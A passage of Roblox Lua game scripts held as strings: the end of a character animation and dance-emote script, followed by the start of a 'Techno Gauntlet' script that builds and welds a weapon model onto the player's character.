if sitting then return end
rj.C0 = CFrame.new()
looking = false
end
end
 
if k == "e" then
if looking then
if sitting then return end
rj.C0 = CFrame.new()
looking = false
end
end
end)
 
 
game:service'RunService'.Stepped:connect(function()
count = (count % 100) + countspeed
angle = math.pi * math.sin(math.pi*2/100*count)
 
if slidecount < slidecountmax then
slidecount = slidecount + speed
end
if slidecount > slidecountmax then
slidecount = slidecount - speed
end
if global_wait == 380 then global_wait = 0 end
 
sine = sine + sinespeed
if not dancing then
if not sitting then
local ray = Ray.new(rootpart.Position, Vector3.new(0, -1, 0))
local hitz, enz = workspace:FindPartOnRay(ray, char)
if not hitz then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles((math.pi/8/5*slidecount) + math.pi + angle*0.05, 0, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles((math.pi/8/5*slidecount) + math.pi + -angle*0.05, 0, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(-angle*0.28, 0, 0)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(angle*0.28, 0, 0)
if not looking then
rj.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-math.pi/8/5*slidecount, 0, 0)
end
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.pi/8/5*slidecount, 0, 0)
elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 2 then
 
-- idle anim
 
anim = "Idle"
if anim ~= lastanim then
if lastanim == "Walking" then
speed = 0.5
slidecount = 1
slidecountmax = 0
elseif lastanim == "Running" then
speed = 2.5
slidecount = 5
slidecountmax = 0
else
slidecount = 0
slidecountmax = 0
end
end
countspeed = 1
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(angle*0.02, 0, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-angle*0.02, 0, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(-angle*0.01, 0, 0)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(angle*0.01, 0, 0)
if not looking then
rj.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-math.pi/8/5*slidecount, 0, 0)
end
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.pi/8/5*slidecount, 0, 0)
elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 14 then
looking = false
-- walk anim
anim = "Walking"
if anim ~= lastanim then
speed = 0.2
slidecount = 0
slidecountmax = 1
if lastanim == "Running" then
slidecount = 5
end
end
countspeed = 6
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(angle*0.3, 0, math.abs(angle*0.02))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-angle*0.3, 0, -math.abs(angle*0.02))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(-angle*0.28, 0, -math.abs(angle*0.01))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(angle*0.28, 0, math.abs(angle*0.01))
rj.C0 = CFrame.new(0, math.abs(-angle*0.035), 0) * CFrame.Angles(-math.pi/8/5*slidecount, 0, 0)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.pi/8/5*slidecount, 0, 0)
elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude >= 14 then
--run anim
anim = "Running"
if anim ~= lastanim then
speed = 1
slidecount = 0
slidecountmax = 5
if lastanim == "Walking" then
slidecount = 1
end
end
 
looking = false
countspeed = 9
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(angle*0.4, 0, math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-angle*0.4, 0, -math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(-angle*0.38, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(angle*0.38, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.pi/8/5*slidecount, 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.055), 0) * CFrame.Angles(-math.pi/8/5*slidecount, math.sin(angle*0.05), 0)
end
 
lastanim = anim
else
countspeed = 1
local ray = Ray.new(rootpart.Position, Vector3.new(0, -2, 0))
local hitz, enz = workspace:FindPartOnRay(ray, char)
if not hitz then
rj.C0 = CFrame.new(0, -0.5, 0) * CFrame.Angles(-math.pi/2, 0, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.rad(30), 0, -math.pi/16)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(math.rad(30), 0, math.pi/16)
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(-math.pi-math.rad(30), 0, -math.pi/10)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-math.pi-math.rad(30), 0, math.pi/10)
else
rj.C0 = CFrame.new(0, -0.35, 0) * CFrame.Angles(math.rad(10), 0, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.pi/2-math.rad(10), 0, -math.pi/16)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(math.pi/2-math.rad(10), 0, math.pi/16)
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(-math.rad(10), 0, -math.pi/10)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(-math.rad(10), 0, math.pi/10)
end
 
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(angle*0.055, 0, 0)
end
else
if superannoying then
countspeed = 5
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, -math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.15), 0)
elseif barrelroll then
countspeed = 5
sinespeed = 0.1
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, 0, math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, 0, -math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(0, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(0, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(math.sin(sine)*2.5, 0, 0) * CFrame.Angles(-math.pi/2, math.sin(sine)*4.5, 0)
elseif dubstepgun then
global_wait = (global_wait % 380) + 1
countspeed = 5
if global_wait < 249 - 40 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, -math.abs(angle*0.27))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, math.abs(angle*0.27))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.15), 0)
elseif global_wait > 249 - 40 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.4, 0, math.abs(angle*0.11))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, 0, -math.abs(angle*0.11))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.09))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.09))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.075), 0) * CFrame.Angles(0, math.pi/3 + math.sin(angle*0.15), 0)
end
elseif youpirate then
global_wait = (global_wait % 380) + 1
countspeed = 5
if global_wait < 79 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.1, 0, -math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(angle*0.2, 0, math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.02), 0) * CFrame.Angles(0, math.sin(angle*0.15), 0)
elseif global_wait < 299 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, 0, math.abs(angle*0.11))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, 0, -math.abs(angle*0.11))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.2, 0, -math.abs(angle*0.1))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.2, 0, math.abs(angle*0.1))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), math.sin(angle*0.19), 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.055+0.2), 0) * CFrame.Angles(0, math.sin(angle*0.15), 0)
elseif global_wait > 299 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.1, 0, -math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(angle*0.2, 0, math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.02), 0) * CFrame.Angles(0, math.sin(angle*0.15), 0)
end
elseif canttouch then
countspeed = 5
global_wait = (global_wait % 160) + 1
if global_wait == 160 then global_wait = 0 end
if global_wait < 39 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, -math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.03), 0) * CFrame.Angles(0, -math.pi/6, 0)
elseif global_wait < 79 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, -math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, 0, math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.1, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.03), 0) * CFrame.Angles(0, math.pi/6, 0)
elseif global_wait < 119 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(0.01, 0, 0.17)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(0.01, 0, -0.17)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(0, -math.abs(angle*0.05), -math.abs(angle*0.06))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(0, -math.abs(angle*0.05), math.abs(angle*0.06))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.02), 0) * CFrame.Angles(0, 0, 0)
torso.CFrame = torso.CFrame * CFrame.new(0.05, 0, 0)
elseif global_wait > 119 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(0.01, 0, 0.17)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(0.01, 0, -0.17)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(0, -math.abs(angle*0.05), -math.abs(angle*0.06))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(0, -math.abs(angle*0.05), math.abs(angle*0.06))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.02), 0) * CFrame.Angles(0, 0, 0)
torso.CFrame = torso.CFrame * CFrame.new(-0.05, 0, 0)
end
elseif gangnam then
countspeed = 5
if global_wait == 180 then global_wait = 0 end
global_wait = (global_wait % 180) + 1
if global_wait < 89 then
ls.C0 = CFrame.new(-.2,.1,-.1) * CFrame.Angles(math.pi/2.5 + math.abs(angle*0.2), 0, math.pi/3 + math.abs(angle*0.05))
rs.C0 = CFrame.new(.2,.1,-.1) * CFrame.Angles(math.pi/2.5 + math.abs(angle*0.2), 0, -math.pi/3 + -math.abs(angle*0.05))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.05), 0)
elseif global_wait > 89 then
ls.C0 = CFrame.new(-.2,.1,-.1) * CFrame.Angles(math.pi/2.5 + math.abs(angle*0.2), 0, math.pi/3 + math.abs(angle*0.05))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + math.sin(angle*0.1), 0, -math.sin(angle*0.1))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.05), 0)
end
elseif foxie then
countspeed = 5
global_wait = (global_wait % 380) + 2
if global_wait < 89 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi + math.abs(angle*0.1), 0, -math.abs(angle*0.2))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + math.abs(angle*0.1), 0, math.abs(angle*0.2))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.rad(global_wait*4), 0)
elseif global_wait > 89 then
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + math.abs(angle*0.2), 0, math.abs(angle*0.05))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + math.abs(angle*0.2), 0, -math.abs(angle*0.05))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, math.sin(angle*0.1))
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.05), 0)
end
elseif durka then
countspeed = 2
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + math.abs(angle*0.2), 0, math.abs(angle*0.07))
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(angle*0.1, 0, -math.abs(angle*0.07))
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, 0, -math.abs(angle*0.03))
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, 0, math.abs(angle*0.03))
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
rj.C0 = CFrame.new(0, math.abs(-angle*.035), 0) * CFrame.Angles(0, math.sin(angle*0.05), 0)
elseif saxguy then
countspeed = 5
ls.C0 = CFrame.new(-.25,.1,-.1) * CFrame.Angles(math.pi/2.5, 0, math.pi/4)
rs.C0 = CFrame.new(.25,.1,-.1) * CFrame.Angles(math.rad(60), 0, -math.pi/4)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-math.abs(angle*0.1), 0, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(0, 0, 0)
rj.C0 = CFrame.new(0, -math.abs(angle*0.01), math.abs(angle*0.01)) * CFrame.Angles(math.abs(angle*0.1), 0, 0)
elseif heya then
countspeed = 5
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi + -angle*0.2, -angle*0.1, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi + angle*0.2, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, angle*0.1, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, -angle*0.1, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(0.2), 0, 0)
rj.C0 = CFrame.new(0, math.abs(angle*0.05), 0) * CFrame.Angles(0, math.sin(angle*0.07), 0)
elseif jb then
countspeed = 5
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + -angle*0.2, -angle*0.1, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, angle*0.1, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, -angle*0.1, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(0.2), 0, 0)
rj.C0 = CFrame.new(0, math.abs(angle*0.05), 0) * CFrame.Angles(0, math.abs(angle*0.1), 0)
elseif canttt then
countspeed = 5
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/2 + -angle*0.2, -angle*0.1, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/2 + angle*0.2, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, angle*0.1, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, -angle*0.1, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(0.2), 0, 0)
rj.C0 = CFrame.new(0, math.abs(angle*0.05), 0) * CFrame.Angles(0, math.abs(angle*0.1), 0)
elseif bronymusic then
countspeed = 5
ls.C0 = CFrame.new(-.1,.1,-.15) * CFrame.Angles(math.pi/2 + -angle*0.1, -angle*0.1, 0)
rs.C0 = CFrame.new(.1,.1,-.15) * CFrame.Angles(math.pi/2 + angle*0.1, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.25,0) * CFrame.Angles(math.pi/2 + angle*0.1, 0, 0)
rh.C0 = CFrame.new(.1,-.25,0) * CFrame.Angles(math.pi/2 + -angle*0.1, 0, 0)
neck.C0 = CFrame.new(0,.25,0) * CFrame.Angles(math.pi/2 + math.abs(angle*0.25), 0, 0)
rj.C0 = CFrame.new(0, -0.2 + math.abs(angle*0.05), 0) * CFrame.Angles(-math.rad(85), 0, 0)
elseif sheddy then
countspeed = 7
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/4 + -angle*0.4, -angle*0.1, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/4 + angle*0.4, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, angle*0.1, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, -angle*0.1, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(0.2), 0, 0)
rj.C0 = CFrame.new(0, math.abs(angle*0.05), 0) * CFrame.Angles(0, math.abs(angle*0.1), 0)
elseif burndem then
countspeed = 4
ls.C0 = CFrame.new(-.3,.1,0) * CFrame.Angles(math.pi/4 + -angle*0.4, -angle*0.1, 0)
rs.C0 = CFrame.new(.3,.1,0) * CFrame.Angles(math.pi/4 + angle*0.4, angle*0.1, 0)
lh.C0 = CFrame.new(-.1,-.2,0) * CFrame.Angles(angle*0.05, angle*0.1, -0.06)
rh.C0 = CFrame.new(.1,-.2,0) * CFrame.Angles(-angle*0.05, -angle*0.1, 0.06)
neck.C0 = CFrame.new(0,.2,0) * CFrame.Angles(math.abs(0.2), 0, 0)
rj.C0 = CFrame.new(0, math.abs(angle*0.05), 0) * CFrame.Angles(0, math.abs(angle*0.1), 0)
end
end
end)
plr.Chatted:connect(function(msg)
game:service'Chat':Chat(head, msg, 0)
if msg == "reset/" then
char:breakJoints()
end
if msg == "resp/" then
plr:LoadCharacter()
end
end)
end)
if not ran and err then
print(err)
end
]]
 
 
TechnoGauntlets = [[
Player = game:GetService("Players").LocalPlayer
Character = Player.Character
PlayerGui = Player.PlayerGui
Backpack = Player.Backpack
Torso = Character.Torso
Head = Character.Head
Humanoid = Character.Humanoid
LeftArm = Character["Left Arm"]
LeftLeg = Character["Left Leg"]
RightArm = Character["Right Arm"]
RightLeg = Character["Right Leg"]
LS = Torso["Left Shoulder"]
LH = Torso["Left Hip"]
RS = Torso["Right Shoulder"]
RH = Torso["Right Hip"]
Neck = Torso.Neck
it=Instance.new
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
attack = false
attacktype = 1
attackdebounce = false
MMouse=nil
combo=0
Mode="Choose"
Aiming=false
DroneTarget=Torso.Position
Drone1=nil
Drone2=nil
Drone3=nil
Bullets=10
BowAim=false
SnipAim=false
--player
player = nil
--save shoulders
RSH, LSH = nil, nil
--welds
RW, LW = Instance.new("Weld"), Instance.new("Weld")
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
 
 
if Character:findFirstChild("Techno Gauntlet",true) ~= nil then
Character:findFirstChild("Techno Gauntlet",true).Parent = nil
end
 
 
function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
local fp = it("Part")
fp.formFactor = formfactor
fp.Parent = parent
fp.Reflectance = reflectance
fp.Transparency = transparency
fp.CanCollide = false
fp.Locked=true
fp.BrickColor = brickcolor
fp.Name = name
fp.Size = size
fp.Position = Torso.Position
fp.BottomSurface="Smooth"
fp.TopSurface="Smooth"
fp:BreakJoints()
return fp
end
 
function mesh(Mesh,part,meshtype,meshid,offset,scale)
local mesh = it(Mesh)
mesh.Parent = part
if Mesh=="SpecialMesh" then
mesh.MeshType = meshtype
mesh.MeshId = meshid
end
mesh.Offset=offset
mesh.Scale=scale
return mesh
end
 
function weld(parent,part0,part1,c0)
local weld = it("Weld")
weld.Parent = parent
weld.Part0 = part0
weld.Part1 = part1
weld.C0 = c0
return weld
end
 
local cone=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Cone",vt(1,1,1))
local conemsh=mesh("SpecialMesh",cone,"FileMesh","http://www.roblox.com/asset/?id=1778999",vt(0,0,0),vt(0.5,0.5,0.5))
local screen1=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen1",vt(1,1,1))
local screen1msh=mesh("BlockMesh",screen1,"","",vt(0,0,0),vt(0.1,0.8,0.9))
local screen2=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen2",vt(1,1,1))
local screen2msh=mesh("BlockMesh",screen2,"","",vt(0,0,0),vt(0.1,0.8,0.9))
local screen3=part(3,modelzorz,0,1,BrickColor.new("Bright blue"),"Screen3",vt(1,1,1))
local screen3msh=mesh("BlockMesh",screen3,"","",vt(0,0,0),vt(0.1,0.8,0.9))
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(.2,.2,255)
light1.Range=10
light1.Parent=screen1
light2=light1:Clone()
light2.Parent=screen2
light3=light1:Clone()
light3.Parent=screen3
 
if Character:findFirstChild("Drone",true) ~= nil then
Character:findFirstChild("Drone",true).Parent = nil
end
 
local modelzorz = Instance.new("Model")
modelzorz.Parent = Character
modelzorz.Name = "Techno Gauntlet"
 
local prt1=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part1",vt(1,1,1))
local prt2=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
local prt3=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local prt4=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
local prt5=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
local prt6=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part6",vt(1,1,1))
local prt7=part(3,modelzorz,0,0,Torso.BrickColor,"Part7",vt(1,1,1))
local prt8=part(3,modelzorz,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
local prt9=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Part9",vt(1,1,1))
local prt10=part(3,modelzorz,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
 
msh1=mesh("BlockMesh",prt1,"","",vt(0,0,0),vt(1.1,0.6,1.1))
msh2=mesh("BlockMesh",prt2,"","",vt(0,0,0),vt(0.2,0.7,1.05))
msh3=mesh("BlockMesh",prt3,"","",vt(0,0,0),vt(1.05,0.7,0.2))
msh4=mesh("BlockMesh",prt4,"","",vt(0,0,0),vt(1.4,1.6,0.2))
msh5=mesh("BlockMesh",prt5,"","",vt(0,0,0),vt(1.4,1.6,0.2))
msh6=mesh("BlockMesh",prt6,"","",vt(0,0,0),vt(0.6,0.1,0.6))
msh7=mesh("SpecialMesh",prt7,"Sphere","",vt(0,0,0),vt(0.5,0.5,0.5))
msh8=mesh("CylinderMesh",prt8,"","",vt(0,0,0),vt(0.6,0.1,0.6))
msh9=mesh("CylinderMesh",prt9,"","",vt(0,0,0),vt(0.3,0.1,0.3))
msh10=mesh("CylinderMesh",prt10,"","",vt(0,0,0),vt(0.2,0.1,0.2))
 
local wld1=weld(prt1,prt1,RightArm,euler(0,0,0)*cf(0,0.3,0))
local wld2=weld(prt2,prt2,prt1,euler(0,0,0)*cf(0,0.4,0))
local wld3=weld(prt3,prt3,prt1,euler(0,0,0)*cf(0,0.4,0))
local wld4=weld(prt4,prt4,prt1,euler(0,0.785,0)*cf(0,-0.51,0))
local wld5=weld(prt5,prt5,prt1,euler(0,-0.785,0)*cf(0,-0.51,0))
local wld6=weld(prt6,prt6,prt1,euler(0,0,0)*cf(0,-1.3,0))
local wld7=weld(prt7,prt7,prt6,euler(0,0,0)*cf(0,0,0))
local wld8=weld(prt8,prt8,prt1,euler(0,0,-1.57)*cf(-0.55,0,0))
local wld9=weld(prt9,prt9,prt8,euler(0,0,0)*cf(0,0.05,0))
local wld10=weld(prt10,prt10,prt9,euler(0,0,0)*cf(0,0.01,0))
 
numb2=0
for i=1,4 do
numb=0.3
for i=1,3 do
local prtclaw=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partclaw",vt(1,1,1))
mshclaw=mesh("SpecialMesh",prtclaw,"Wedge","",vt(0,0,0),vt(0.1,0.3,0.1))
local wldclaw=weld(prtclaw,prtclaw,prt1,euler(1.57,-1.57,-1.57)*cf(-0.55,0.3,numb)*euler(0,numb2,0))
numb=numb-0.3
end
numb2=numb2+1.57
end
 
numb=0
for i=1,5 do
local prtgear=part(3,modelzorz,0,0,BrickColor.new("Medium stone grey"),"Partgear",vt(1,1,1))
